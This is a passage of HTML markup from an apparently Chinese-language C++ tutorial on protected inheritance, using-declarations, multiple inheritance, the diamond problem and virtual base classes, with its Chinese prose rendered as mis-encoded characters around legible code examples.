class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>è®¿é—®è§„åˆ™:</strong></p><p>å½“ä¸€ä¸ªç±»ä¿æŠ¤ç»§æ‰¿è‡ªåŸºç±»æ—¶ï¼š</p><ul><li>  åŸºç±»çš„ <code>public</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **<code>protected</code>**ã€‚</li><li>  åŸºç±»çš„ <code>protected</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º **<code>protected</code>**ã€‚</li><li>  åŸºç±»çš„ <code>private</code> æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­ä»ç„¶æ˜¯<strong>ä¸å¯ç›´æ¥è®¿é—®</strong>çš„ã€‚</li></ul><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  ä¸ç§æœ‰ç»§æ‰¿ç±»ä¼¼ï¼Œå®ƒä¹Ÿæ˜¯ä¸€ç§å®ç°ç»§æ‰¿ï¼Œä¸ç»§æ‰¿æ¥å£ã€‚å¤–éƒ¨ä»£ç ä¸èƒ½è®¿é—®ç»§æ‰¿æ¥çš„æˆå‘˜ã€‚</li><li>  ä¸ç§æœ‰ç»§æ‰¿ä¸åŒçš„æ˜¯ï¼ŒåŸºç±»çš„å…¬æœ‰å’Œä¿æŠ¤æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­æ˜¯ <code>protected</code> çš„ï¼Œè¿™æ„å‘³ç€<strong>åç»­ä»è¯¥æ´¾ç”Ÿç±»ç»§æ‰¿çš„ç±»</strong>ä»ç„¶å¯ä»¥è®¿é—®è¿™äº›æˆå‘˜ã€‚è€Œåœ¨ç§æœ‰ç»§æ‰¿ä¸‹ï¼Œè¿™äº›æˆå‘˜åœ¨æ´¾ç”Ÿç±»ä¸­å˜ä¸º <code>private</code>ï¼Œåç»­çš„æ´¾ç”Ÿç±»å°±æ— æ³•è®¿é—®äº†ã€‚</li></ul><p><strong>ç”¨é€”:</strong> ä¿æŠ¤ç»§æ‰¿éå¸¸å°‘è§ã€‚å®ƒä¸»è¦ç”¨äºä¸€ç§ç‰¹æ®Šæƒ…å†µï¼šä½ æƒ³è®©åŸºç±»çš„å®ç°å¯¹å¤–éƒ¨éšè—ï¼Œä½†åˆå¸Œæœ›åç»­çš„æ´¾ç”Ÿç±»èƒ½å¤Ÿè®¿é—®è¿™äº›å®ç°ã€‚</p><h3 id="14-2-4-ä½¿ç”¨-using-é‡æ–°å®šä¹‰è®¿é—®æƒé™"><a href="#14-2-4-ä½¿ç”¨-using-é‡æ–°å®šä¹‰è®¿é—®æƒé™" class="headerlink" title="14.2.4 ä½¿ç”¨ using é‡æ–°å®šä¹‰è®¿é—®æƒé™"></a>14.2.4 ä½¿ç”¨ <code>using</code> é‡æ–°å®šä¹‰è®¿é—®æƒé™</h3><p>æœ‰æ—¶ï¼Œåœ¨ä½¿ç”¨ç§æœ‰æˆ–ä¿æŠ¤ç»§æ‰¿æ—¶ï¼Œæˆ‘ä»¬å¯èƒ½å¸Œæœ›å°†åŸºç±»çš„<strong>æŸä¸ª</strong>ç‰¹å®šæˆå‘˜æ¢å¤å…¶åŸå§‹çš„è®¿é—®æƒé™ï¼ˆæˆ–ä½¿å…¶å˜ä¸º <code>public</code>ï¼‰ï¼Œè€Œä¸æ˜¯è®©å®ƒåœ¨æ´¾ç”Ÿç±»ä¸­ä¿æŒ <code>private</code> æˆ– <code>protected</code>ã€‚å¯ä»¥ä½¿ç”¨ <code>using</code> å£°æ˜æ¥å®ç°è¿™ä¸€ç‚¹ã€‚</p><p><strong>è¯­æ³•:</strong></p><p>åœ¨æ´¾ç”Ÿç±»çš„å®šä¹‰ä¸­ï¼ˆé€šå¸¸æ”¾åœ¨ <code>public</code> æˆ– <code>protected</code> éƒ¨åˆ†ï¼‰ï¼Œä½¿ç”¨ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> BaseClassName::MemberName;</span><br></pre></td></tr></table></figure><p>è¿™ä¼šå°† <code>BaseClassName</code> ä¸­çš„ <code>MemberName</code>ï¼ˆå¯ä»¥æ˜¯æ•°æ®æˆå‘˜ã€æˆå‘˜å‡½æ•°ã€ç”šè‡³é‡è½½çš„ä¸€ç»„å‡½æ•°ï¼‰å¼•å…¥åˆ°æ´¾ç”Ÿç±»çš„ä½œç”¨åŸŸï¼Œå¹¶ä½¿å…¶å…·æœ‰ <code>using</code> å£°æ˜æ‰€åœ¨åŒºåŸŸçš„è®¿é—®æƒé™ï¼ˆå¦‚æœåœ¨ <code>public</code> ä¸‹ï¼Œå°±å˜ä¸º <code>public</code>ï¼›å¦‚æœåœ¨ <code>protected</code> ä¸‹ï¼Œå°±å˜ä¸º <code>protected</code>ï¼‰ã€‚</p><p><strong>ç¤ºä¾‹ (ä¿®æ”¹ <code>Student</code> ç±»):</strong></p><p>å‡è®¾æˆ‘ä»¬å¸Œæœ› <code>Student</code> ç±»ï¼ˆç§æœ‰ç»§æ‰¿ç‰ˆæœ¬ï¼‰èƒ½å¤Ÿç›´æ¥ä½¿ç”¨ <code>valarray</code> çš„ <code>size()</code> å’Œ <code>sum()</code> æ–¹æ³•ï¼Œå°±åƒå®ƒä»¬æ˜¯ <code>Student</code> çš„å…¬æœ‰æ–¹æ³•ä¸€æ ·ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// studenti.h (ä¿®æ”¹å)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> :</span> <span class="keyword">private</span> <span class="built_in">std</span>::<span class="built_in">string</span>, <span class="keyword">private</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ostream &amp; <span class="title">arr_out</span><span class="params">(<span class="built_in">std</span>::ostream &amp; os)</span> <span class="keyword">const</span></span>;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... æ„é€ å‡½æ•° ...</span></span><br><span class="line">    ~Student() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ using å£°æ˜å°†åŸºç±»çš„éƒ¨åˆ†æˆå‘˜æš´éœ²ä¸º public</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;::size; <span class="comment">// ä½¿ valarray::size() æˆä¸º Student çš„ public æˆå‘˜</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;::<span class="keyword">operator</span>[]; <span class="comment">// ä½¿ valarray::operator[] æˆä¸º Student çš„ public æˆå‘˜</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä»ç„¶éœ€è¦æä¾›è‡ªå·±çš„æ¥å£ï¼Œæˆ–è€…æš´éœ²æ›´å¤šåŸºç±»æˆå‘˜</span></span><br><span class="line">    <span class="function"><span class="keyword">double</span> <span class="title">Average</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp; <span class="title">Name</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">    <span class="comment">// operator[] ç°åœ¨é€šè¿‡ using å£°æ˜æš´éœ²äº†ï¼Œå¯ä»¥ç§»é™¤ Student è‡ªå·±çš„ç‰ˆæœ¬ (å¦‚æœç­¾ååŒ¹é…)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... å‹å…ƒ ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// studenti.cpp (ä¿®æ”¹å)</span></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">Student::Average</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ç°åœ¨å¯ä»¥ç›´æ¥è°ƒç”¨ size() å’Œ sum() (å¦‚æœ sum ä¹Ÿ using äº†)</span></span><br><span class="line">    <span class="keyword">if</span> (size() &gt; <span class="number">0</span>) <span class="comment">// ç›´æ¥è°ƒç”¨ç»§æ‰¿æ¥çš„ size()</span></span><br><span class="line">        <span class="comment">// return sum() / size(); // å‡è®¾ sum() ä¹Ÿ using äº†</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt;::sum() / size(); <span class="comment">// æˆ–è€…ä»ç„¶æ˜¾å¼è°ƒç”¨</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// operator[] çš„å®ç°å¯ä»¥ç§»é™¤äº†ï¼Œå› ä¸º using å£°æ˜æä¾›äº†å®ƒ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... å…¶ä»–å®ç°å¯èƒ½ä¹Ÿéœ€è¦è°ƒæ•´ ...</span></span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> <code>using</code> å£°æ˜åªæ”¹å˜æˆå‘˜çš„<strong>å¯è®¿é—®æ€§</strong>ï¼Œä¸æ”¹å˜å…¶ç»§æ‰¿å±æ€§ï¼ˆä¾‹å¦‚ï¼Œè™šå‡½æ•°ä»ç„¶æ˜¯è™šå‡½æ•°ï¼‰ã€‚å®ƒä¸èƒ½ç”¨æ¥é™ä½è®¿é—®æƒé™ï¼ˆä¾‹å¦‚ï¼Œä¸èƒ½åœ¨ <code>private</code> éƒ¨åˆ† <code>using</code> ä¸€ä¸ªåŸºç±»çš„ <code>public</code> æˆå‘˜æ¥ä½¿å…¶å˜ä¸º <code>private</code>ï¼‰ã€‚</p><p><code>using</code> å£°æ˜æä¾›äº†ä¸€ç§åœ¨ç§æœ‰/ä¿æŠ¤ç»§æ‰¿ä¸‹é€‰æ‹©æ€§åœ°æš´éœ²åŸºç±»æ¥å£çš„æ–¹æ³•ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½ä¼šç ´ååŸæœ¬éšè—å®ç°çš„æ„å›¾ã€‚</p><h2 id="14-3-å¤šé‡ç»§æ‰¿"><a href="#14-3-å¤šé‡ç»§æ‰¿" class="headerlink" title="14.3 å¤šé‡ç»§æ‰¿"></a>14.3 å¤šé‡ç»§æ‰¿</h2><p><strong>å¤šé‡ç»§æ‰¿ (Multiple Inheritance, MI)</strong> å…è®¸ä¸€ä¸ªæ´¾ç”Ÿç±»ä»<strong>å¤šä¸ª</strong>åŸºç±»ç»§æ‰¿ã€‚è¿™æ„å‘³ç€æ´¾ç”Ÿç±»å¯ä»¥åŒæ—¶æ‹¥æœ‰å¤šä¸ªåŸºç±»çš„ç‰¹æ€§å’Œæ¥å£ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DerivedClassName</span> :</span> accessSpecifier1 BaseClass1, accessSpecifier2 BaseClass2, ... &#123;</span><br><span class="line">    <span class="comment">// ... æ´¾ç”Ÿç±»æˆå‘˜ ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>  åœ¨ç±»å¤´ä¸­åˆ—å‡ºæ‰€æœ‰è¦ç»§æ‰¿çš„åŸºç±»ï¼Œç”¨é€—å·åˆ†éš”ã€‚</li><li>  å¯ä»¥ä¸ºæ¯ä¸ªåŸºç±»æŒ‡å®šä¸åŒçš„è®¿é—®è¯´æ˜ç¬¦ï¼ˆ<code>public</code>, <code>protected</code>, <code>private</code>ï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹åœºæ™¯:</strong></p><p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªé€šç”¨çš„ <code>Worker</code> ç±»ï¼Œè¡¨ç¤ºå·¥ä½œäººå‘˜çš„åŸºæœ¬ä¿¡æ¯ã€‚æˆ‘ä»¬è¿˜æœ‰ <code>Singer</code> ç±»è¡¨ç¤ºæ­Œæ‰‹ï¼Œ<code>Waiter</code> ç±»è¡¨ç¤ºæœåŠ¡å‘˜ã€‚ç°åœ¨æˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ª <code>SingingWaiter</code> ç±»ï¼Œè¡¨ç¤ºä¸€ä¸ªæ—¢ä¼šå”±æ­Œåˆèƒ½æä¾›æœåŠ¡çš„æœåŠ¡å‘˜ã€‚<code>SingingWaiter</code> å¯ä»¥åŒæ—¶ç»§æ‰¿ <code>Singer</code> å’Œ <code>Waiter</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Worker</span> &#123;</span> <span class="comment">/* ... id, name ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> &#123;</span> <span class="comment">/* ... voice range, sing() ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> &#123;</span> <span class="comment">/* ... panache, serve() ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SingingWaiter ç»§æ‰¿è‡ª Singer å’Œ Waiter</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Singer, <span class="keyword">public</span> Waiter &#123;</span><br><span class="line">    <span class="comment">// ... SingingWaiter ç‰¹æœ‰çš„æˆå‘˜ ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>æ½œåœ¨é—®é¢˜:</strong></p><p>å¤šé‡ç»§æ‰¿è™½ç„¶å¼ºå¤§ï¼Œä½†ä¹Ÿå¼•å…¥äº†ä¸€äº›å¤æ‚æ€§å’Œæ½œåœ¨çš„é—®é¢˜ï¼š</p><h3 id="14-3-1-æœ‰å¤šå°‘-Worker-é’»çŸ³é—®é¢˜-Diamond-Problem"><a href="#14-3-1-æœ‰å¤šå°‘-Worker-é’»çŸ³é—®é¢˜-Diamond-Problem" class="headerlink" title="14.3.1 æœ‰å¤šå°‘ Worker (é’»çŸ³é—®é¢˜ - Diamond Problem)"></a>14.3.1 æœ‰å¤šå°‘ Worker (é’»çŸ³é—®é¢˜ - Diamond Problem)</h3><p>å¦‚æœå¤šä¸ªåŸºç±»æ˜¯ä»<strong>åŒä¸€ä¸ª</strong>æ›´è¿œçš„åŸºç±»æ´¾ç”Ÿè€Œæ¥çš„ï¼Œé‚£ä¹ˆæ´¾ç”Ÿç±»å°†åŒ…å«è¯¥å…±åŒåŸºç±»çš„<strong>å¤šä¸ªå‰¯æœ¬</strong>ï¼ˆæ¯ä¸ªç»§æ‰¿è·¯å¾„ä¸€ä¸ªï¼‰ã€‚è¿™è¢«ç§°ä¸º<strong>é’»çŸ³é—®é¢˜</strong>æˆ–<strong>è±å½¢ç»§æ‰¿</strong>ã€‚</p><p><strong>ç¤ºä¾‹:</strong> å‡è®¾ <code>Singer</code> å’Œ <code>Waiter</code> éƒ½ç»§æ‰¿è‡ª <code>Worker</code>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Worker</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">long</span> id;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> fullname;</span><br><span class="line">    <span class="keyword">virtual</span> ~Worker() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="comment">/* ... show id, name ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> :</span> <span class="keyword">public</span> Worker &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">int</span> panache;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... show worker info + panache ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> :</span> <span class="keyword">public</span> Worker &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span>other, alto, contralto, soprano, bass, baritone, tenor&#125;;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> Vtypes = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">int</span> voice;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... show worker info + voice ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SingingWaiter ç»§æ‰¿è‡ª Waiter å’Œ Singerï¼Œä¸¤è€…éƒ½ç»§æ‰¿è‡ª Worker</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Waiter, <span class="keyword">public</span> Singer &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">Show</span><span class="params">()</span> <span class="keyword">const</span> <span class="keyword">override</span> </span>&#123; <span class="comment">/* ... show all info ... */</span> &#125;</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¸€ä¸ª <code>SingingWaiter</code> å¯¹è±¡å†…éƒ¨ä¼šåŒ…å«<strong>ä¸¤ä¸ª</strong> <code>Worker</code> å­å¯¹è±¡ï¼šä¸€ä¸ªæ¥è‡ª <code>Waiter</code> çš„ç»§æ‰¿è·¯å¾„ï¼Œå¦ä¸€ä¸ªæ¥è‡ª <code>Singer</code> çš„ç»§æ‰¿è·¯å¾„ã€‚</p><p>è¿™ä¼šå¯¼è‡´å‡ ä¸ªé—®é¢˜ï¼š</p><ol><li><p><strong>æˆå‘˜è®¿é—®æ­§ä¹‰:</strong> å¦‚æœä½ æƒ³è®¿é—® <code>SingingWaiter</code> å¯¹è±¡çš„ <code>id</code> æˆ– <code>fullname</code>ï¼ˆæ¥è‡ª <code>Worker</code>ï¼‰ï¼Œç¼–è¯‘å™¨ä¸çŸ¥é“ä½ æŒ‡çš„æ˜¯å“ªä¸ª <code>Worker</code> å­å¯¹è±¡çš„æˆå‘˜ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SingingWaiter sw;</span><br><span class="line"><span class="comment">// sw.id = 123; // é”™è¯¯ï¼æ­§ä¹‰ï¼šWaiter::Worker::id è¿˜æ˜¯ Singer::Worker::idï¼Ÿ</span></span><br></pre></td></tr></table></figure></li><li><p> <strong>èµ„æºå†—ä½™:</strong> <code>Worker</code> çš„æ•°æ®æˆå‘˜è¢«å­˜å‚¨äº†ä¸¤æ¬¡ï¼Œé€ æˆæµªè´¹ã€‚</p></li></ol><p><strong>è§£å†³æ–¹æ¡ˆï¼šè™šåŸºç±» (Virtual Base Classes)</strong></p><p>ä¸ºäº†è§£å†³é’»çŸ³é—®é¢˜ï¼ŒC++ å¼•å…¥äº†<strong>è™šåŸºç±»</strong>çš„æ¦‚å¿µã€‚å½“ä¸€ä¸ªç±»è¢«å£°æ˜ä¸ºè™šåŸºç±»æ—¶ï¼Œæ´¾ç”Ÿç±»åœ¨é€šè¿‡<strong>å¤šæ¡è·¯å¾„</strong>ç»§æ‰¿è¯¥åŸºç±»æ—¶ï¼Œåªä¼šåŒ…å«è¯¥è™šåŸºç±»çš„<strong>ä¸€ä¸ª</strong>å…±äº«å­å¯¹è±¡å‰¯æœ¬ã€‚</p><ul><li><p><strong>è¯­æ³•:</strong> åœ¨æ´¾ç”Ÿç±»ç»§æ‰¿è™šåŸºç±»æ—¶ï¼Œä½¿ç”¨ <code>virtual</code> å…³é”®å­—ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Waiter å’Œ Singer å°† Worker ä½œä¸ºè™šåŸºç±»ç»§æ‰¿</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> :</span> <span class="keyword">virtual</span> <span class="keyword">public</span> Worker &#123; <span class="comment">/* ... */</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SingingWaiter æ­£å¸¸ç»§æ‰¿ Waiter å’Œ Singer</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Waiter, <span class="keyword">public</span> Singer &#123; <span class="comment">/* ... */</span> &#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong>æ•ˆæœ:</strong> ç°åœ¨ï¼Œ<code>SingingWaiter</code> å¯¹è±¡åªåŒ…å«<strong>ä¸€ä¸ª</strong>å…±äº«çš„ <code>Worker</code> å­å¯¹è±¡ã€‚è®¿é—® <code>id</code> æˆ– <code>fullname</code> ä¸å†æœ‰æ­§ä¹‰ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SingingWaiter sw;</span><br><span class="line">sw.id = <span class="number">123</span>; <span class="comment">// OKï¼åªæœ‰ä¸€ä¸ª Worker å­å¯¹è±¡ï¼Œæ²¡æœ‰æ­§ä¹‰ã€‚</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ„é€ å‡½æ•°è´£ä»»:</strong> å½“ä½¿ç”¨è™šåŸºç±»æ—¶ï¼Œ<strong>æœ€åº•å±‚çš„æ´¾ç”Ÿç±»</strong>ï¼ˆåœ¨è¿™ä¸ªä¾‹å­ä¸­æ˜¯ <code>SingingWaiter</code>ï¼‰çš„æ„é€ å‡½æ•°<strong>è´Ÿè´£</strong>è°ƒç”¨è™šåŸºç±»ï¼ˆ<code>Worker</code>ï¼‰çš„æ„é€ å‡½æ•°ã€‚ä¸­é—´çš„åŸºç±»ï¼ˆ<code>Waiter</code>, <code>Singer</code>ï¼‰åœ¨å…¶åˆå§‹åŒ–åˆ—è¡¨ä¸­å¯¹è™šåŸºç±»çš„æ„é€ å‡½æ•°è°ƒç”¨ä¼šè¢«å¿½ç•¥ï¼ˆé™¤éè¯¥ä¸­é—´ç±»æ˜¯ç›´æ¥åˆ›å»ºå¯¹è±¡ï¼‰ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SingingWaiter æ„é€ å‡½æ•°éœ€è¦åˆå§‹åŒ– Worker</span></span><br><span class="line">SingingWaiter::SingingWaiter(<span class="keyword">const</span> Worker &amp; wk, <span class="keyword">int</span> p, <span class="keyword">int</span> v)</span><br><span class="line">    : Worker(wk), <span class="comment">// æ˜¾å¼è°ƒç”¨è™šåŸºç±»æ„é€ å‡½æ•°</span></span><br><span class="line">      Waiter(wk, p),</span><br><span class="line">      Singer(wk, v) &#123;</span><br><span class="line">    <span class="comment">// Waiter(wk, p) å’Œ Singer(wk, v) å†…éƒ¨å¯¹ Worker çš„æ„é€ è°ƒç”¨ä¼šè¢«å¿½ç•¥</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="14-3-2-å“ªä¸ªæ–¹æ³•-æˆå‘˜åå†²çª"><a href="#14-3-2-å“ªä¸ªæ–¹æ³•-æˆå‘˜åå†²çª" class="headerlink" title="14.3.2 å“ªä¸ªæ–¹æ³• (æˆå‘˜åå†²çª)"></a>14.3.2 å“ªä¸ªæ–¹æ³• (æˆå‘˜åå†²çª)</h3><p>å³ä½¿æ²¡æœ‰é’»çŸ³é—®é¢˜ï¼Œå¦‚æœä¸åŒçš„åŸºç±»æä¾›äº†åŒåçš„æ–¹æ³•æˆ–æ•°æ®æˆå‘˜ï¼Œæ´¾ç”Ÿç±»åœ¨è°ƒç”¨è¯¥æˆå‘˜æ—¶ä¹Ÿä¼šäº§ç”Ÿ<strong>æ­§ä¹‰</strong>ã€‚</p><p><strong>ç¤ºä¾‹:</strong> å‡è®¾ <code>Waiter</code> å’Œ <code>Singer</code> éƒ½æœ‰ä¸€ä¸ªåä¸º <code>Talent()</code> çš„æ–¹æ³•ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Waiter</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Talent</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Serves with style.\n&quot;</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singer</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Talent</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sings beautifully.\n&quot;</span>; &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SingingWaiter</span> :</span> <span class="keyword">public</span> Waiter, <span class="keyword">public</span> Singer &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">SingingWaiter sw;</span><br><span class="line"><span class="comment">// sw.Talent(); // é”™è¯¯ï¼æ­§ä¹‰ï¼šWaiter::Talent() è¿˜æ˜¯ Singer::Talent()ï¼Ÿ</span></span><br></pre></td></tr></table></figure><p><strong>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ (<code>::</code>)</strong></p><p>ä¸ºäº†è§£å†³è¿™ç§æ­§ä¹‰ï¼Œéœ€è¦ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦æ˜ç¡®æŒ‡å®šè¦è°ƒç”¨å“ªä¸ªåŸºç±»çš„ç‰ˆæœ¬ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span 